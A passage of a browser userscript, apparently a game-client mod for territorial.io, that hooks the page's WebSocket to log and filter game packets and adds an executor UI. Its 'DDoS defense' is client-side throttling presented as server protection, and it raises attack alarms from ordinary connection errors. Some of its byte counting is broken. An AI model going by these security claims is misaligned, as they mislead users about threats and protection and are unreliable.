      
      return 'MIXED';
    },
    
    getMaxConsecutiveFailures() {
      let max = 0;
      let current = 0;
      for (const anomaly of this.anomalies) {
        if (anomaly.type === 'CONNECTION_ERROR') {
          current++;
          max = Math.max(max, current);
        } else if (anomaly.type === 'CONNECTION_SUCCESS' || anomaly.type === 'RECONNECTION_ATTEMPT') {
          current = 0;
        }
      }
      return max;
    },
    
    detectAttackWaves() {
      const waves = [];
      let waveStart = null;
      let waveCount = 0;
      const WAVE_THRESHOLD = 60000; // 60 second gaps between waves
      
      for (let i = 0; i < this.anomalies.length; i++) {
        if (this.anomalies[i].type === 'CONNECTION_ERROR') {
          if (!waveStart) waveStart = this.anomalies[i].timestamp;
          waveCount++;
          
          const nextError = this.anomalies.slice(i + 1).find(a => a.type === 'CONNECTION_ERROR');
          if (!nextError || (nextError.timestamp - this.anomalies[i].timestamp) > WAVE_THRESHOLD) {
            waves.push({
              start: new Date(waveStart).toISOString(),
              end: new Date(this.anomalies[i].timestamp).toISOString(),
              errorCount: waveCount,
              durationMs: this.anomalies[i].timestamp - waveStart
            });
            waveStart = null;
            waveCount = 0;
          }
        }
      }
      
      return waves;
    },
    
    getReport() {
      const severity = this.calculateSeverity();
      const patterns = this.analyzePatterns();
      const timeline = this.getAttackTimeline();
      
      return {
        enabled: this.enabled,
        startTime: this.startTime,
        duration: Date.now() - this.startTime,
        totalPackets: this.packets.length,
        anomaliesDetected: this.anomalies.length,
        severity: severity,
        patterns: patterns,
        timeline: timeline.slice(-10),
        anomalies: this.anomalies.slice(-20),
        packets: this.packets.slice(-50)
      };
    },
    
    exportReport() {
      const report = this.getReport();
      const json = JSON.stringify(report, null, 2);
      const blob = new Blob([json], { type: 'application/json' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `ddos-report-${Date.now()}.json`;
      a.click();
      URL.revokeObjectURL(url);
    },
    
    compileMultipleReports(reportFiles) {
      // Aggregate multiple report files for extended analysis
      const compiled = {
        reports: [],
        totalDuration: 0,
        combinedAnomalies: [],
        overallSeverity: 'UNKNOWN',
        aggregatePatterns: {}
      };
      
      // This would typically read multiple JSON files
      // For now, return structure for future implementation
      return compiled;
    }
  };
 
  // --- WebSocket Auto-Reconnect System ---
  const reconnectManager = {
    connections: new Map(),
    
    register(url, createConnection) {
      if (!this.connections.has(url)) {
        this.connections.set(url, {
          url,
          createConnection,
          reconnectAttempts: 0,
          maxAttempts: 10,
          baseDelay: 1000, // 1 second
          maxDelay: 30000,  // 30 seconds
          nextRetry: 0
        });
      }
    },
    
    getDelay(attempts) {
      // Exponential backoff: 1s, 2s, 4s, 8s, 16s, 30s, 30s...
      const delay = Math.min(this.connections.get([...this.connections.keys()][0])?.baseDelay * Math.pow(2, attempts) || 1000, 30000);
      return delay;
    },
    
    async attemptReconnect(url) {
      const config = this.connections.get(url);
      if (!config) return null;
      
      const delay = this.getDelay(config.reconnectAttempts);
      config.reconnectAttempts++;
      
      if (config.reconnectAttempts > config.maxAttempts) {
        ddosReport.anomalies.push({
          type: 'CONNECTION_FAILURE',
          timestamp: Date.now(),
          url,
          attempts: config.reconnectAttempts,
          message: 'Max reconnection attempts exceeded'
        });
        showNotification(`⚠️ Failed to reconnect to ${url} after ${config.reconnectAttempts} attempts`, 'error', 5000);
        return null;
      }
      
      // Log reconnection attempt
      ddosReport.anomalies.push({
        type: 'RECONNECTION_ATTEMPT',
        timestamp: Date.now(),
        url,
        attempt: config.reconnectAttempts,
        delay,
        message: `Attempting reconnect #${config.reconnectAttempts}...`
      });
      
      showNotification(`🔄 Reconnecting to game server... (Attempt ${config.reconnectAttempts}/${config.maxAttempts})`, 'info', 2000);
      
      await new Promise(resolve => setTimeout(resolve, delay));
      
      try {
        const ws = config.createConnection();
        config.reconnectAttempts = 0; // Reset on success
        showNotification('✅ Reconnected to game server!', 'success', 2000);
        return ws;
      } catch (err) {
        return this.attemptReconnect(url);
      }
    },
    
    reset(url) {
      const config = this.connections.get(url);
      if (config) config.reconnectAttempts = 0;
    }
  };
 
  // --- Advanced DDoS Defense System (L4 + L7) ---
  const defenseSystem = {
    enabled: true,
    
    // L4 Defense: Rate limiting for packets
    l4Defense: {
      enabled: true,
      maxPacketsPerSecond: 1000,
      maxBytesPerSecond: 50 * 1024 * 1024, // 50 MB/s
      windowSize: 1000, // milliseconds
      packets: [],
      blockedPackets: [],
      bytesSent: 0,
      
      isPacketFlood() {
        const now = Date.now();
        this.packets = this.packets.filter(t => now - t < this.windowSize);
        
        const pps = this.packets.length / (this.windowSize / 1000);
        const isFlood = pps > this.maxPacketsPerSecond;
        
        if (isFlood) {
          ddosReport.l4Attacks.push({
            type: 'L4_FLOOD_BLOCKED',
            timestamp: now,
            pps: Math.round(pps),
            threshold: this.maxPacketsPerSecond,
            action: 'BLOCKED'
          });
        }
        
        return isFlood;
      },
      
      recordPacket(size = 0) {
        const now = Date.now();
        
        // Check if we should block this packet
        if (this.isPacketFlood()) {
          this.blockedPackets.push({
            timestamp: now,
            size: size,
            reason: 'PPS_EXCEEDED'
          });
          return false; // Block the packet
        }
        
        // Check bandwidth limit
        const recentBytesSent = this.getRecentBytesPerSecond();
        if (recentBytesSent + size > this.maxBytesPerSecond) {
          this.blockedPackets.push({
            timestamp: now,
            size: size,
            reason: 'BANDWIDTH_EXCEEDED'
          });
          return false; // Block the packet
        }
        
        this.packets.push(now);
        this.bytesSent += size;
        return true; // Allow the packet
      },
      
      getRecentBytesPerSecond() {
        const now = Date.now();
        let totalBytes = 0;
        for (let i = 0; i < this.packets.length; i++) {
          if (now - this.packets[i] < this.windowSize) {
            totalBytes += this.packets[i]?.size || 0;
          }
        }
        return totalBytes;
      },
      
      getStatus() {
        const now = Date.now();
        const recent = this.packets.filter(t => now - t < this.windowSize);
        const pps = recent.length / (this.windowSize / 1000);
        const blockedRate = this.blockedPackets.filter(p => now - p.timestamp < this.windowSize).length;
        
        return {
          currentPPS: Math.round(pps),
          blockedPPS: blockedRate,
          threshold: this.maxPacketsPerSecond,
          utilization: Math.round((pps / this.maxPacketsPerSecond) * 100),
          isUnderAttack: pps > this.maxPacketsPerSecond * 0.8,
          blockRate: blockedRate > 0 ? `${Math.round((blockedRate / (pps + blockedRate)) * 100)}%` : '0%'
        };
      }
    },
    
    // L7 Defense: Request rate limiting and validation with ENFORCEMENT
    l7Defense: {
      enabled: true,
      maxRequestsPerSecond: 100,
      maxConcurrentRequests: 50,
      requestTimeout: 10000, // 10 seconds
      windowSize: 1000, // milliseconds
      requests: [],
      blockedRequests: [],
      concurrentRequests: 0,
      requestQueue: [],
      requestHistory: [],
      
      canMakeRequest() {
        const now = Date.now();
        this.requests = this.requests.filter(t => now - t < this.windowSize);
        
        const rps = this.requests.length / (this.windowSize / 1000);
        const rateLimitExceeded = rps > this.maxRequestsPerSecond;
        const concurrencyExceeded = this.concurrentRequests >= this.maxConcurrentRequests;
        
        if (rateLimitExceeded || concurrencyExceeded) {
          const reason = rateLimitExceeded ? 'RPS_EXCEEDED' : 'CONCURRENCY_EXCEEDED';
          this.blockedRequests.push({
            timestamp: now,
            reason: reason,
            rps: Math.round(rps),
            concurrent: this.concurrentRequests
          });
          
          ddosReport.l7Attacks.push({
            type: 'L7_FLOOD_BLOCKED',
            timestamp: now,
            rps: Math.round(rps),
            threshold: this.maxRequestsPerSecond,
            action: 'BLOCKED',
            reason: reason
          });
          
          // Queue the request for later processing (backpressure)
          if (this.requestQueue.length < this.maxConcurrentRequests * 2) {
            return 'QUEUED'; // Return to queue instead of blocking
          }
          
          return false; // Hard block if queue is full
        }
        
        return true; // Allow the request
      },
      
      startRequest() {
        const now = Date.now();
        this.requests.push(now);
        this.concurrentRequests++;
        this.requestHistory.push({
          startTime: now,
          method: 'GET',
          status: 'IN_PROGRESS'
        });
      },
      
      endRequest(requestId = null) {
        this.concurrentRequests = Math.max(0, this.concurrentRequests - 1);
        
        // Process queued requests if slots available
        if (this.requestQueue.length > 0 && this.concurrentRequests < this.maxConcurrentRequests) {
          const queuedReq = this.requestQueue.shift();
          if (queuedReq) {
            this.startRequest();
          }
        }
      },
      
      getQueuedRequestsCount() {
        return this.requestQueue.length;
      },
      
      getStatus() {
        const now = Date.now();
        const recent = this.requests.filter(t => now - t < this.windowSize);
        const rps = recent.length / (this.windowSize / 1000);
        const blockedRate = this.blockedRequests.filter(p => now - p.timestamp < this.windowSize).length;
        
        return {
          currentRPS: Math.round(rps),
          blockedRPS: blockedRate,
          threshold: this.maxRequestsPerSecond,
          concurrentRequests: this.concurrentRequests,
          maxConcurrent: this.maxConcurrentRequests,
          queuedRequests: this.requestQueue.length,
          utilization: Math.round((rps / this.maxRequestsPerSecond) * 100),
          concurrencyUtilization: Math.round((this.concurrentRequests / this.maxConcurrentRequests) * 100),
          isUnderAttack: rps > this.maxRequestsPerSecond * 0.8,
          blockRate: blockedRate > 0 ? `${Math.round((blockedRate / (rps + blockedRate)) * 100)}%` : '0%'
        };
      }
    },
    
    // Connection pooling for resilience
    connectionPool: {
      maxConnections: 5,
      activeConnections: [],
      waitingRequests: [],
      
      acquireConnection(createFn) {
        if (this.activeConnections.length < this.maxConnections) {
          const conn = createFn();
          this.activeConnections.push(conn);
          return conn;
        }
        
        // Queue the request
        return new Promise((resolve) => {
          this.waitingRequests.push(resolve);
        });
      },
      
      releaseConnection(conn) {
        const waitingCallback = this.waitingRequests.shift();
        if (waitingCallback) {
          waitingCallback(conn);
        } else {
          const idx = this.activeConnections.indexOf(conn);
          if (idx > -1) this.activeConnections.splice(idx, 1);
        }
      },
      
      getStatus() {
        return {
          active: this.activeConnections.length,
          max: this.maxConnections,
          waiting: this.waitingRequests.length,
          utilization: Math.round((this.activeConnections.length / this.maxConnections) * 100)
        };
      }
    },
    
    // Adaptive defense: Adjust thresholds based on threat level
    adaptDefenses(severity) {
      if (severity.level === 'CRITICAL') {
        // Aggressive defense mode
        this.l4Defense.maxPacketsPerSecond = 100; // Very strict
        this.l7Defense.maxRequestsPerSecond = 10;  // Very strict
        this.l7Defense.maxConcurrentRequests = 10;
      } else if (severity.level === 'SEVERE') {
        this.l4Defense.maxPacketsPerSecond = 500;
        this.l7Defense.maxRequestsPerSecond = 50;
        this.l7Defense.maxConcurrentRequests = 25;
      } else if (severity.level === 'MODERATE') {
        this.l4Defense.maxPacketsPerSecond = 750;
        this.l7Defense.maxRequestsPerSecond = 75;
        this.l7Defense.maxConcurrentRequests = 40;
      } else {
        // Normal mode
        this.l4Defense.maxPacketsPerSecond = 1000;
        this.l7Defense.maxRequestsPerSecond = 100;
        this.l7Defense.maxConcurrentRequests = 50;
      }
    },
    
    getDefenseStatus() {
      return {
        l4: this.l4Defense.getStatus(),
        l7: this.l7Defense.getStatus(),
        pool: this.connectionPool.getStatus(),
        timestamp: new Date().toISOString()
      };
    },
    
    // Real-time enforcement: Block/throttle RPS & PPS
    enforceRateLimits(requestType = 'http', size = 0) {
      if (requestType === 'udp' || requestType === 'packet') {
        // L4 enforcement
        return this.l4Defense.recordPacket(size);
      } else if (requestType === 'http' || requestType === 'websocket') {
        // L7 enforcement
        const canProceed = this.l7Defense.canMakeRequest();
        
        if (canProceed === true) {
          this.l7Defense.startRequest();
          return true;
        } else if (canProceed === 'QUEUED') {
          // Add to queue for later processing
          this.l7Defense.requestQueue.push({
            timestamp: Date.now(),
            type: requestType
          });
          return 'queued'; // Delayed execution
        } else {
          return false; // Blocked
        }
      }
      
      return true; // Unknown type, allow by default
    },
    
    completeRequest() {
      this.l7Defense.endRequest();
    },
    
    // Get comprehensive attack blocking stats
    getBlockingStats() {
      const l4Stats = this.l4Defense.getStatus();
      const l7Stats = this.l7Defense.getStatus();
      
      return {
        timestamp: Date.now(),
        l4: {
          status: l4Stats,
          isBlocking: l4Stats.blockedPPS > 0,
          totalBlocked: this.l4Defense.blockedPackets.length,
          avgBlockRate: l4Stats.blockRate
        },
        l7: {
          status: l7Stats,
          isBlocking: l7Stats.blockedRPS > 0,
          totalBlocked: this.l7Defense.blockedRequests.length,
          avgBlockRate: l7Stats.blockRate,
          queued: l7Stats.queuedRequests
        },
        defense_active: l4Stats.isUnderAttack || l7Stats.isUnderAttack,
        threat_level: this.calculateDefenseThreatLevel()
      };
    },
    
    calculateDefenseThreatLevel() {
      const l4 = this.l4Defense.getStatus();
      const l7 = this.l7Defense.getStatus();
      
      const l4Threat = l4.utilization > 80 ? 3 : l4.utilization > 60 ? 2 : 1;
      const l7Threat = l7.utilization > 80 ? 3 : l7.utilization > 60 ? 2 : 1;
      
      const totalThreat = l4Threat + l7Threat;
      
      if (totalThreat >= 5) return 'CRITICAL';
      if (totalThreat >= 4) return 'SEVERE';
      if (totalThreat >= 3) return 'MODERATE';
      if (totalThreat >= 2) return 'ACTIVE';
      return 'NORMAL';
    }
  };
 
  // --- DDoS Attack Warning System ---
  let ddosWarningShown = false;
  
  const showDDoSWarningModal = (severity) => {
    if (ddosWarningShown && Date.now() - ddosWarningShown < 30000) return; // Show max once per 30s
    ddosWarningShown = Date.now();
    
    const severityColor = {
      'CRITICAL': { color: '#ef4444', bg: 'rgba(239,68,68,0.15)', icon: '🔴' },
      'SEVERE': { color: '#f97316', bg: 'rgba(249,115,22,0.15)', icon: '🟠' },
      'MODERATE': { color: '#eab308', bg: 'rgba(234,179,8,0.15)', icon: '🟡' },
      'ACTIVE': { color: '#3b82f6', bg: 'rgba(59,130,246,0.15)', icon: '🔵' }
    };
    
    const severityLevel = severity.level || 'ACTIVE';
    const theme = severityColor[severityLevel] || severityColor['ACTIVE'];
    
    const defenseChecklist = {
      l4Enabled: defenseSystem.l4Defense.enabled,
      l7Enabled: defenseSystem.l7Defense.enabled,
      autoReconnect: settings.autoReconnect,
      propagandaBlock: settings.blockPropaganda
    };
    
    let defenseHTML = `
      <div style="margin-top: 15px; padding: 12px; background: ${theme.bg}; border-left: 4px solid ${theme.color}; border-radius: 4px; font-size: 12px">
        <strong style="color: ${theme.color}">🛡️ Anti-DDoS Defense Status:</strong>
        <div style="margin-top: 8px; font-size: 11px; line-height: 1.8">
          <p style="margin: 4px 0; color: ${defenseChecklist.l4Enabled ? '#51cf66' : '#ff6b6b'}">
            ${defenseChecklist.l4Enabled ? '✅' : '❌'} <strong>L4 Defense (Transport):</strong> ${defenseChecklist.l4Enabled ? 'ENABLED' : 'DISABLED'}
          </p>
          <p style="margin: 4px 0; color: ${defenseChecklist.l7Enabled ? '#51cf66' : '#ff6b6b'}">
            ${defenseChecklist.l7Enabled ? '✅' : '❌'} <strong>L7 Defense (Application):</strong> ${defenseChecklist.l7Enabled ? 'ENABLED' : 'DISABLED'}
          </p>
          <p style="margin: 4px 0; color: ${defenseChecklist.autoReconnect ? '#51cf66' : '#ff6b6b'}">
            ${defenseChecklist.autoReconnect ? '✅' : '❌'} <strong>Auto-Reconnect:</strong> ${defenseChecklist.autoReconnect ? 'ENABLED' : 'DISABLED'}
          </p>
          <p style="margin: 4px 0; color: ${defenseChecklist.propagandaBlock ? '#51cf66' : '#ff6b6b'}">
            ${defenseChecklist.propagandaBlock ? '✅' : '❌'} <strong>Propaganda Blocking:</strong> ${defenseChecklist.propagandaBlock ? 'ENABLED' : 'DISABLED'}
          </p>
        </div>
        ${(!defenseChecklist.l4Enabled || !defenseChecklist.l7Enabled || !defenseChecklist.autoReconnect) ? 
          `<p style="margin-top: 10px; padding: 8px; background: rgba(255,107,107,0.2); border-radius: 3px; color: #ff6b6b; font-weight: 600">
            ⚠️ Not all defenses are enabled! Open Settings to enable protection.
          </p>` : 
          `<p style="margin-top: 10px; padding: 8px; background: rgba(81,207,102,0.2); border-radius: 3px; color: #51cf66; font-weight: 600">
            ✅ All defenses are active and protecting your connection!
          </p>`
        }
      </div>
    `;
    
    const threatDescription = {
      'CRITICAL': 'Server is under <strong>CRITICAL ATTACK</strong> - Massive packet flood detected. Your connection is heavily protected but may experience delays.',
      'SEVERE': 'Server is under <strong>SEVERE ATTACK</strong> - High-intensity DDoS detected on multiple layers. Stay calm while defenses mitigate impact.',
      'MODERATE': 'Server is experiencing <strong>MODERATE ATTACK</strong> - Elevated traffic detected. Anti-DDoS measures are protecting you.',
      'ACTIVE': 'DDoS attack detected - System defenses are <strong>ACTIVE</strong> and protecting your connection.'
    };
    
    const threatStats = {
      'CRITICAL': '⚠️ L4: High PPS | L7: High RPS',
      'SEVERE': '⚠️ L4: Elevated PPS | L7: Elevated RPS',
      'MODERATE': '⚠️ L4: Moderate PPS | L7: Moderate RPS',
      'ACTIVE': '📊 Unusual traffic patterns detected'
    };
    
    const modal = document.createElement('div');
    modal.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.7);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 10000000;
      animation: fadeIn 0.3s ease;
    `;
    
    modal.innerHTML = `
      <div style="
        background: linear-gradient(135deg, #1e1e2e 0%, #2d2d44 100%);
        border: 2px solid ${theme.color};
        border-radius: 12px;
        padding: 25px;
        max-width: 500px;
        width: 90%;
        box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        color: #fff;
        animation: slideUp 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
      ">
        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 15px">
          <span style="font-size: 32px">${theme.icon}</span>
          <div>
            <h2 style="margin: 0; font-size: 18px; color: ${theme.color}">🚨 DDoS Attack Alert</h2>
            <p style="margin: 4px 0 0 0; font-size: 12px; color: rgba(255,255,255,0.6)">Severity: <strong>${severityLevel}</strong></p>
          </div>
        </div>
        
        <div style="background: rgba(0,0,0,0.3); padding: 12px; border-radius: 6px; margin-bottom: 15px; border-left: 3px solid ${theme.color}">
          <p style="margin: 0; font-size: 13px; line-height: 1.6">${threatDescription[severityLevel]}</p>
          <p style="margin: 8px 0 0 0; font-size: 11px; color: rgba(255,255,255,0.7)">${threatStats[severityLevel]}</p>
        </div>
        
        <div style="background: rgba(79,70,229,0.15); padding: 12px; border-radius: 6px; margin-bottom: 15px; border-left: 3px solid #818cf8">
          <p style="margin: 0 0 10px 0; font-size: 12px; font-weight: 600; color: #818cf8">📋 What to Do:</p>
          <ul style="margin: 0; padding-left: 20px; font-size: 11px; color: rgba(255,255,255,0.85); line-height: 1.8">
            <li><strong>DO NOT REFRESH</strong> - Stay on this page. Reloading may disconnect you.</li>
            <li><strong>Stay Calm</strong> - Defense systems are actively protecting you.</li>
            <li><strong>Wait</strong> - Attack will pass. Automated reconnection is active.</li>
            <li><strong>Check Settings</strong> - Ensure all anti-DDoS measures are enabled (see below).</li>
          </ul>
        </div>
        
        ${defenseHTML}
        
        <div style="margin-top: 15px; padding: 12px; background: rgba(100,150,200,0.15); border-radius: 6px; border-left: 3px solid #6b96ff; font-size: 11px; color: rgba(255,255,255,0.85)">
          <p style="margin: 0; font-weight: 600">💡 How It Works:</p>
          <p style="margin: 5px 0 0 0">This script uses multi-layer rate limiting to protect you during attacks. Packets and requests exceeding safe thresholds are automatically blocked, while legitimate traffic is prioritized through intelligent queuing.</p>
        </div>
        
        <div style="display: flex; gap: 10px; margin-top: 20px">
          <button id="ddos-dismiss-btn" style="
            flex: 1;
            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
            border: none;
            border-radius: 6px;
            padding: 10px;
            color: #fff;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
          ">Got It - Stay Calm</button>
          <button id="ddos-settings-btn" style="
            flex: 1;
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            border: none;
            border-radius: 6px;
            padding: 10px;
            color: #fff;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
          ">Open Settings</button>
        </div>
      </div>
      <style>
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes slideUp {
          from { 
            opacity: 0;
            transform: translateY(30px);
          }
          to { 
            opacity: 1;
            transform: translateY(0);
          }
        }
        #ddos-dismiss-btn:hover, #ddos-settings-btn:hover {
          transform: translateY(-2px);
          box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        }
      </style>
    `;
    
    document.body.appendChild(modal);
    
    modal.querySelector('#ddos-dismiss-btn').addEventListener('click', () => {
      modal.remove();
    });
    
    modal.querySelector('#ddos-settings-btn').addEventListener('click', () => {
      modal.remove();
      // Trigger settings tab
      setTimeout(() => {
        document.querySelector('a[data-tab="settings"]')?.click() || document.querySelector('#settings-tab')?.click();
      }, 100);
    });
  };
 
  const OriginalWebSocket = unsafeWindow.WebSocket;
  unsafeWindow.WebSocket = function(url, protocols) {
    let isGameSocket = false;
    try {
        const isTerritorial = window.location.hostname.includes('territorial.io') || document.querySelector('meta[content="FXclient"]');
        const urlObj = new URL(url, window.location.href);
        const urlString = urlObj.toString();
        const proxyParam = urlObj.searchParams.get('u');
        isGameSocket = isTerritorial && (urlString.includes('/s52/') || (proxyParam && atob(proxyParam).includes('/s52/')));
    } catch (e) { /* Invalid URL */ }
 
    if (!isGameSocket) return new OriginalWebSocket(url, protocols);
 
    console.log(`[TriX] Intercepting WebSocket: ${url}`);
    if (settings.socketToasts) {
        showNotification(`Socket Detected: ${url}`, "success");
    }
    const ws = new OriginalWebSocket(url, protocols);
    monitoredConnections.set(ws, { url, state: 'CONNECTING', log: [], createdAt: Date.now() });
    onConnectionStateChange();
 
    const originalSend = ws.send.bind(ws);
    ws.send = function(data) {
        if (settings.blockPropaganda && data && data.length === 2 && data[0] === 30 && data[1] === 40) {
            console.log('[TriX] Blocked propaganda packet.');
            if (settings.propagandaToasts) {
                const toastContent = `<img src="${GM_info.script.icon}" style="width:24px; height:24px; margin-right: 10px;"> <b>Propaganda Blocked!</b>`;
                showNotification(toastContent, "warning", 2000);
            }
            return;
        }
        logPacketCallback(ws, 'send', data);
        return originalSend(data);
    };
    ws.addEventListener('message', event => { logPacketCallback(ws, 'receive', event.data); });
    ws.addEventListener('open', () => { 
      const c = monitoredConnections.get(ws); 
      if (c) {
        c.state = 'OPEN'; 
        c.connectedAt = Date.now();
      }
      reconnectManager.reset(url);
      onConnectionStateChange(); 
      updateConnectionStatus('connected', 'Connection Established'); 
    });
    ws.addEventListener('close', () => { 
      monitoredConnections.delete(ws); 
      onConnectionStateChange(); 
      updateConnectionStatus('disconnected', 'Disconnected');
      
      // Auto-reconnect if enabled
      if (settings.autoReconnect) {
        reconnectManager.register(url, () => new OriginalWebSocket(url, protocols));
        reconnectManager.attemptReconnect(url);
      }
    });
    ws.addEventListener('error', (event) => { 
      const c = monitoredConnections.get(ws);
      if (c) {
        c.state = 'ERROR';
        c.lastError = Date.now();
      }
      monitoredConnections.delete(ws); 
      onConnectionStateChange(); 
      updateConnectionStatus('error', 'Connection Error');
      
      // Log error as DDoS anomaly (with better context)
      ddosReport.anomalies.push({
        type: 'CONNECTION_ERROR',
        timestamp: Date.now(),
        url,
        message: event.message || 'WebSocket connection failed',
        code: event.code || 'UNKNOWN',
        reason: event.reason || 'No reason provided',
        isServerError: event.message?.includes('503') || event.message?.includes('timeout') || event.message?.includes('50x')
      });
      
      // Trigger adaptive defense based on severity
      const severity = ddosReport.calculateSeverity();
      if (severity.level !== 'NORMAL' && severity.level !== 'ACTIVE') {
        // Only show warning for actual attacks (MODERATE+), not server errors
        defenseSystem.adaptDefenses(severity);
        console.log(`[TriX Defense] Activated ${severity.level} mode - Thresholds adjusted`);
        
        // Show DDoS warning modal to user only for confirmed attacks
        showDDoSWarningModal(severity);
      } else if (severity.level === 'ACTIVE') {
        // Log but don't alarm for suspicious patterns
        console.log(`[TriX] Potential attack detected - monitoring...`);
      }
      
      // Auto-reconnect if enabled
      if (settings.autoReconnect) {
        reconnectManager.register(url, () => new OriginalWebSocket(url, protocols));
        reconnectManager.attemptReconnect(url);
      }
    });
    unsafeWindow.trixSocket = ws;
    return ws;
  };
 
  // --- UI State ---
  let isMinimized = false;
  let currentTab = "home";
  let activeNetworkTab = "logger";
  let scriptTabs = [{ id: "tab1", name: "Script 1", content: "// Welcome to the revamped TriX Executor!\nconsole.log('Phoenix Rising!');" }];
  let activeScriptTab = "tab1";
  
 
 
  if (!GM_getValue("scripts", null)) GM_setValue("scripts", JSON.stringify([]));
 
  // --- CSS Styles ---
  const styles = `
    .trix-executor { position: fixed; top: 50px; right: 50px; width: 650px; height: 500px; background: linear-gradient(135deg, #1e1e2e 0%, #2d2d44 100%); border-radius: 12px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); z-index: 999999; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #fff; overflow: hidden; transition: all 0.3s ease; display: none; flex-direction: column; }
    .trix-executor.ready { display: flex; }
    .trix-header { background: linear-gradient(90deg, #4f46e5 0%, #7c3aed 100%); height: 40px; display: flex; justify-content: space-between; align-items: center; padding: 0 10px 0 15px; border-radius: 12px 12px 0 0; flex-shrink: 0; cursor: move; user-select: none; }
    .trix-title-area { display: flex; align-items: center; gap: 8px; }
    .trix-icon { width: 24px; height: 24px; }
    .trix-title { font-weight: 600; font-size: 14px; color: #fff; display: flex; align-items: center; }
    .revamp-badge { display: inline-block; margin-left: 8px; padding: 2px 6px; font-size: 9px; font-weight: 700; background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%); color: #422006; border-radius: 4px; vertical-align: middle; transform: translateY(-1px); }
    .trix-header-info { display: flex; align-items: center; gap: 15px; font-size: 12px; color: rgba(255,255,255,0.8); contain: layout style paint; will-change: contents; min-width: 150px; }
    #trix-conn-status { width: 10px; height: 10px; border-radius: 50%; background-color: #ef4444; transition: background-color 0.3s; } #trix-conn-status.connected { background-color: #10b981; } #trix-conn-status.error { background-color: #f59e0b; }
    .trix-controls { display: flex; align-items: center; gap: 8px; } .trix-btn { width: 20px; height: 20px; border-radius: 4px; border: none; cursor: pointer; font-size: 12px; font-weight: bold; display: flex; justify-content: center; align-items: center; padding: 0; transition: all 0.2s ease; }
    .minimize-btn { background: #fbbf24; color: #92400e; } .maximize-btn { background: #10b981; color: #065f46; } .close-btn { background: #ef4444; color: #991b1b; }
    .trix-btn:hover { transform: scale(1.1); box-shadow: 0 2px 8px rgba(0,0,0,0.3); }
    .trix-body { display: flex; height: 100%; overflow: hidden; }
    .trix-sidebar { width: 150px; background: rgba(0,0,0,0.2); padding: 15px 0; border-right: 1px solid rgba(255,255,255,0.1); flex-shrink: 0; display: flex; flex-direction: column; }
    .sidebar-nav { flex-grow: 1; }
    .sidebar-item { padding: 12px 20px; cursor: pointer; transition: all 0.2s ease; font-size: 13px; border-left: 3px solid transparent; }
    .sidebar-item:hover { background: rgba(255,255,255,0.1); border-left-color: #4f46e5; } .sidebar-item.active { background: rgba(79,70,229,0.3); border-left-color: #4f46e5; }
    .sidebar-footer { padding: 10px; border-top: 1px solid rgba(255,255,255,0.1); }
    #trix-user-profile-container { display: flex; align-items: center; gap: 6px; margin-bottom: 8px; min-height: 40px; }
    #trix-user-profile { display: flex; align-items: center; gap: 6px; padding: 4px; flex: 1; min-width: 0; }
    #trix-user-pfp { width: 32px; height: 32px; border-radius: 50%; border: 2px solid rgba(255,255,255,0.5); flex-shrink: 0; }
    #trix-user-name { font-size: 12px; font-weight: 600; color: #c7d2fe; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; min-width: 0; flex: 1; }
    #trix-account-settings-btn { flex-shrink: 0; }
    .g-signin2 { margin-top: 10px; transform: scale(0.8); transform-origin: center; }
    .trix-content { flex: 1; padding: 20px; overflow-y: auto; }
    .content-section { display: none; height: 100%; box-sizing: border-box; overflow-y: auto; } .content-section.active { display: block; }
    .script-input, .network-textarea { width: 100%; height: 200px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; padding: 15px; color: #fff; font-family: 'Courier New', monospace; font-size: 12px; resize: vertical; outline: none; box-sizing: border-box; }
    .script-tabs, .network-tabs { display: flex; gap: 5px; margin-bottom: 10px; flex-wrap: wrap; }
    .script-tab, .network-tab { background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); border-radius: 6px; padding: 6px 12px; font-size: 11px; cursor: pointer; transition: all 0.2s ease; position: relative; }
    .script-tab.active, .network-tab.active { background: rgba(79,70,229,0.5); border-color: #4f46e5; }
    .add-tab-btn { background: rgba(16,185,129,0.3); border: 1px solid #10b981; color: #10b981; border-radius: 6px; padding: 6px 12px; font-size: 11px; cursor: pointer; transition: all 0.2s ease; }
    .executor-buttons { display: flex; gap: 10px; margin-top: 15px; flex-wrap: wrap; }
    .exec-btn { background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%); border: none; border-radius: 6px; padding: 10px 20px; color: #fff; font-size: 12px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; }
    .exec-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(79,70,229,0.4); }
    .exec-btn:disabled { background: #4b5563; cursor: not-allowed; transform: none; box-shadow: none; }
    .exec-btn.secondary { background: linear-gradient(135deg, #6b7280 0%, #4b5563 100%); } .exec-btn.success { background: linear-gradient(135deg, #10b981 0%, #059669 100%); } .exec-btn.danger { background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%); }
    .search-input { width: 100%; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; padding: 12px; color: #fff; font-size: 13px; margin-bottom: 15px; outline: none; box-sizing: border-box; }
    .script-cards { display: grid; gap: 15px; max-height: 300px; overflow-y: auto; }
    .script-card { background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; padding: 15px; cursor: pointer; transition: all 0.2s ease; }
    .script-card:hover { background: rgba(255,255,255,0.1); transform: translateY(-2px); }
